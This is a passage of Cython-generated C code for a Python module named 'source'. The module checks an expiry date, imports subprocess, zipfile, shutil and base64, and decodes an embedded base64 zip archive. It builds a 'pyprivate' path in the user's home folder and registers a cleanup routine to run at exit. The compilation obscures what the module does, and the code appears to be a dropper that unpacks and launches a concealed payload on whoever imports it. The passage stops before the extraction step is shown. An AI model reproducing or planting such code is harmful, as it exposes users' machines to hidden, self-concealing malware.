  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 42, __pyx_L1_error)
  __pyx_builtin_BaseException = __Pyx_GetBuiltinName(__pyx_n_s_BaseException); if (!__pyx_builtin_BaseException) __PYX_ERR(0, 31, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_n_u_Done); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);

  
  __pyx_tuple__2 = PyTuple_Pack(2, __pyx_kp_u_2025_12_31_00_00_00_000, __pyx_kp_u_Y_m_d_H_M_S_f); if (unlikely(!__pyx_tuple__2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__2);
  __Pyx_GIVEREF(__pyx_tuple__2);

  
  __pyx_tuple__3 = PyTuple_Pack(1, __pyx_kp_u_O5_QO); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);

  
  __pyx_tuple__4 = PyTuple_Pack(1, __pyx_int_0); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__4);
  __Pyx_GIVEREF(__pyx_tuple__4);

  
  __pyx_tuple__6 = PyTuple_Pack(1, __pyx_kp_u__5); if (unlikely(!__pyx_tuple__6)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__6);
  __Pyx_GIVEREF(__pyx_tuple__6);

  
  __pyx_codeobj__7 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_cleanup, 26, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__7)) __PYX_ERR(0, 26, __pyx_L1_error)

  
  __pyx_tuple__8 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__8)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__8);
  __Pyx_GIVEREF(__pyx_tuple__8);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_493 = PyInt_FromLong(493); if (unlikely(!__pyx_int_493)) __PYX_ERR(0, 1, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_t_15;
  char const *__pyx_t_16;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_datetime);
  __Pyx_GIVEREF(__pyx_n_s_datetime);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_datetime);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_datetime, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datetime, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_now); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_current_time, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_strptime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_expiry_time, __pyx_t_2) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_current_time); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_expiry_time); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = PyObject_RichCompare(__pyx_t_2, __pyx_t_1, Py_GT); __Pyx_XGOTREF(__pyx_t_3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (__pyx_t_4) {

    
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 12, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 13, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
  }

  
  __pyx_t_3 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_3) < 0) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_Import(__pyx_n_s_shutil, 0, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_shutil, __pyx_t_3) < 0) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_Import(__pyx_n_s_zipfile, 0, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_zipfile, __pyx_t_3) < 0) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_Import(__pyx_n_s_subprocess, 0, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_subprocess, __pyx_t_3) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_Import(__pyx_n_s_base64, 0, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_3) < 0) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_Import(__pyx_n_s_atexit, 0, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_atexit, __pyx_t_3) < 0) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_expanduser); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__6, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_MyHome, __pyx_t_1) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_path); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_join); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_MyHome); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_3);
  __Pyx_INCREF(__pyx_kp_u_pyprivate);
  __Pyx_GIVEREF(__pyx_kp_u_pyprivate);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_pyprivate);
  __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_2, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Pyprivate, __pyx_t_3) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_6source_1cleanup, 0, __pyx_n_s_cleanup, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__7)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cleanup, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_atexit); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_register); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_cleanup); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_AH, __pyx_kp_u_UEsDBBQAAAAIAD2Amls7jcMKkwEAADYC) < 0) __PYX_ERR(0, 36, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_base64); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_b64decode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_AH); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Dev, __pyx_t_2) < 0) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
